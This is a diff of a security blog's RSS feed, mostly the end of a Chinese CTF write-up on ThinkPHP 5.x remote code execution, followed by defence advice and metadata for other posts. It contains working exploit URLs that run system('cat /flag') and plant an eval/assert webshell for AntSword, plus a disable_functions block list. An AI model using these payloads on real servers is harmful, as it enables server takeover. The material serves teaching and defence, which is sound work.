+&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=system&amp;amp;vars[1][]=cat+/flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;或：&lt;/p&gt;
+&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=system&amp;amp;vars[1][]=cat+/var/www/html/flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回类似：&lt;/p&gt;
+&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;flag&lt;/span&gt;&amp;#123;d64e3f2e-xxxx-xxxx-xxxx-&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;ed8fe1b43f3&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;4-使用蚁剑连接-1&#34;&gt;&lt;a href=&#34;#4-使用蚁剑连接-1&#34; class=&#34;headerlink&#34; title=&#34;4. 使用蚁剑连接&#34;&gt;&lt;/a&gt;4. 使用蚁剑连接&lt;/h3&gt;&lt;p&gt;与 ThinkPHP 2.x 类似，可构造 POST 参数的一句话木马：&lt;/p&gt;
+&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=assert&amp;amp;vars[1][]=eval($_POST[1])&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;蚁剑配置&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;URL&lt;/strong&gt;：上述地址&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;密码&lt;/strong&gt;：&lt;code&gt;1&lt;/code&gt;（对应 &lt;code&gt;$_POST[1]&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：PHP（原生）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;编码&lt;/strong&gt;：默认&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;连接后可进行文件管理、命令执行等操作。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;四、防御措施&#34;&gt;&lt;a href=&#34;#四、防御措施&#34; class=&#34;headerlink&#34; title=&#34;四、防御措施&#34;&gt;&lt;/a&gt;四、防御措施&lt;/h2&gt;&lt;h3 id=&#34;1-升级-ThinkPHP-版本&#34;&gt;&lt;a href=&#34;#1-升级-ThinkPHP-版本&#34; class=&#34;headerlink&#34; title=&#34;1. 升级 ThinkPHP 版本&#34;&gt;&lt;/a&gt;1. 升级 ThinkPHP 版本&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;ThinkPHP 2.x&lt;/strong&gt;：升级到更高版本（如 3.x 或 5.0.24+），修复模板解析漏洞。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ThinkPHP 5.x&lt;/strong&gt;：升级到 5.0.24 或更高版本，官方已修复 RCE 漏洞。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-输入验证与过滤&#34;&gt;&lt;a href=&#34;#2-输入验证与过滤&#34; class=&#34;headerlink&#34; title=&#34;2. 输入验证与过滤&#34;&gt;&lt;/a&gt;2. 输入验证与过滤&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;白名单验证&lt;/strong&gt;：限制 &lt;code&gt;s&lt;/code&gt; 参数和模板变量，只允许预定义值。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;过滤危险函数&lt;/strong&gt;：禁用 &lt;code&gt;eval&lt;/code&gt;、&lt;code&gt;assert&lt;/code&gt;、&lt;code&gt;call_user_func_array&lt;/code&gt; 等高危函数。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;参数校验&lt;/strong&gt;：对用户输入进行严格过滤，防止注入。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-禁用危险函数&#34;&gt;&lt;a href=&#34;#3-禁用危险函数&#34; class=&#34;headerlink&#34; title=&#34;3. 禁用危险函数&#34;&gt;&lt;/a&gt;3. 禁用危险函数&lt;/h3&gt;&lt;p&gt;在 &lt;code&gt;php.ini&lt;/code&gt; 中禁用高危函数：&lt;/p&gt;
+&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;disable_functions&lt;/span&gt; = eval,assert,exec,system,passthru,shell_exec,proc_open,call_user_func_array&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;4-最小权限原则&#34;&gt;&lt;a href=&#34;#4-最小权限原则&#34; class=&#34;headerlink&#34; title=&#34;4. 最小权限原则&#34;&gt;&lt;/a&gt;4. 最小权限原则&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;配置 Web 服务器以最低权限运行（如非 root 用户）。&lt;/li&gt;
+&lt;li&gt;限制 PHP 脚本的文件系统访问权限。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;5-Web-应用防火墙（WAF）&#34;&gt;&lt;a href=&#34;#5-Web-应用防火墙（WAF）&#34; class=&#34;headerlink&#34; title=&#34;5. Web 应用防火墙（WAF）&#34;&gt;&lt;/a&gt;5. Web 应用防火墙（WAF）&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;部署 WAF，拦截包含可疑路由（如 &lt;code&gt;\think\app&lt;/code&gt;）或函数（如 &lt;code&gt;system&lt;/code&gt;）的请求。&lt;/li&gt;
+&lt;li&gt;使用正则规则匹配异常 Payload。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;6-安全审计与监控&#34;&gt;&lt;a href=&#34;#6-安全审计与监控&#34; class=&#34;headerlink&#34; title=&#34;6. 安全审计与监控&#34;&gt;&lt;/a&gt;6. 安全审计与监控&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;定期扫描 Web 应用，检查已知漏洞。&lt;/li&gt;
+&lt;li&gt;监控服务器日志，及时发现异常请求。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;五、总结&#34;&gt;&lt;a href=&#34;#五、总结&#34; class=&#34;headerlink&#34; title=&#34;五、总结&#34;&gt;&lt;/a&gt;五、总结&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;项目&lt;/th&gt;
+&lt;th&gt;ThinkPHP 2.x RCE&lt;/th&gt;
+&lt;th&gt;ThinkPHP 5.x RCE&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;漏洞名称&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;ThinkPHP 2.x RCE&lt;/td&gt;
+&lt;td&gt;ThinkPHP 5.x RCE&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;ThinkPHP 2.x&lt;/td&gt;
+&lt;td&gt;ThinkPHP &amp;lt;&amp;#x3D; 5.0.23&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;漏洞原因&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;模板变量解析未过滤&lt;/td&gt;
+&lt;td&gt;动态函数调用未授权&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;利用方法&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;GET&amp;#x2F;POST 参数构造 &lt;code&gt;eval&lt;/code&gt;&amp;#x2F;&lt;code&gt;assert&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;GET 请求构造路由 + 函数调用&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;关键函数&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;eval&lt;/code&gt;, &lt;code&gt;assert&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;call_user_func_array&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;检测方式&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;使用 &lt;code&gt;$&amp;#123;@phpinfo()&amp;#125;&lt;/code&gt; 探测&lt;/td&gt;
+&lt;td&gt;使用 &lt;code&gt;phpinfo&lt;/code&gt; 探测，再尝试 &lt;code&gt;system&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;练习平台&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;BUUCTF（如 &lt;code&gt;node3.buuoj.cn:26104&lt;/code&gt;）&lt;/td&gt;
+&lt;td&gt;BUUCTF（如 &lt;code&gt;node5.buuoj.cn:27945&lt;/code&gt;）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;ThinkPHP 2.x 和 5.x 的 RCE 漏洞利用简单但危害极大，攻击者可通过简单的 URL 构造实现代码或命令执行，甚至完全控制服务器。BUUCTF 靶场为我们提供了便捷的复现环境，通过本文的演示，读者可以深入理解漏洞原理和利用流程。开发者应及时升级框架、加强输入验证、部署 WAF 和监控机制，以有效防范此类漏洞。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。&lt;/p&gt;
+&lt;/blockquote&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/</guid>
             <title>ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）</title>
@@ -233,8 +458,8 @@
             <guid isPermalink="true">https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
             <title>命令执行漏洞</title>
             <link>https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
-            <category>Web安全</category>
             <category>渗透测试</category>
+            <category>Web安全</category>
             <category>命令执行</category>
             <category>漏洞利用</category>
             <pubDate>Sat, 26 Jul 2025 18:53:13 +0800</pubDate>
@@ -615,9 +840,9 @@
             <guid isPermalink="true">https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/</guid>
             <title>SQL注入攻击详解</title>
             <link>https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/</link>
+            <category>渗透测试</category>
             <category>Web安全</category>
             <category>SQL注入</category>
-            <category>渗透测试</category>
             <category>网络安全</category>
             <pubDate>Thu, 24 Jul 2025 07:51:59 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;SQL注入攻击详解&#34;&gt;&lt;a href=&#34;#SQL注入攻击详解&#34; class=&#34;headerlink&#34; title=&#34;SQL注入攻击详解&#34;&gt;&lt;/a&gt;SQL注入攻击详解&lt;/h1&gt;&lt;h2 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;SQL注入作为Web应用程序中最常见的安全漏洞之一，至今仍是攻击者利用的主要手段。本文将详细讲解SQL注入的各种利用方式，帮助安全研究人员和开发者深入理解这一经典漏洞。&lt;/p&gt;
@@ -1081,9 +1306,9 @@
             <guid isPermalink="true">https://bae-ace.github.io/2025/07/21/SQLMap-%E8%87%AA%E5%8A%A8%E5%8C%96-SQL-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/</guid>
             <title>SQLMap 自动化 SQL 注入工具</title>
             <link>https://bae-ace.github.io/2025/07/21/SQLMap-%E8%87%AA%E5%8A%A8%E5%8C%96-SQL-%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/</link>
-            <category>渗透测试</category>
             <category>工具</category>
             <category>sqlmap</category>
+            <category>渗透测试</category>
             <pubDate>Mon, 21 Jul 2025 19:33:02 +0800</pubDate>
             <description><![CDATA[ &lt;h2 id=&#34;SQLMap-自动化-SQL-注入工具&#34;&gt;&lt;a href=&#34;#SQLMap-自动化-SQL-注入工具&#34; class=&#34;headerlink&#34; title=&#34;SQLMap 自动化 SQL 注入工具&#34;&gt;&lt;/a&gt;SQLMap 自动化 SQL 注入工具&lt;/h2&gt;&lt;h2 id=&#34;一、🔍-核心功能与命令选项&#34;&gt;&lt;a href=&#34;#一、🔍-核心功能与命令选项&#34; class=&#34;headerlink&#34; title=&#34;一、🔍 核心功能与命令选项&#34;&gt;&lt;/a&gt;一、🔍 核心功能与命令选项&lt;/h2&gt;&lt;h3 id=&#34;（一）基础检测类-🧪&#34;&gt;&lt;a href=&#34;#（一）基础检测类-🧪&#34; class=&#34;headerlink&#34; title=&#34;（一）基础检测类 🧪&#34;&gt;&lt;/a&gt;（一）基础检测类 🧪&lt;/h3&gt;&lt;table&gt;
 &lt;thead&gt;
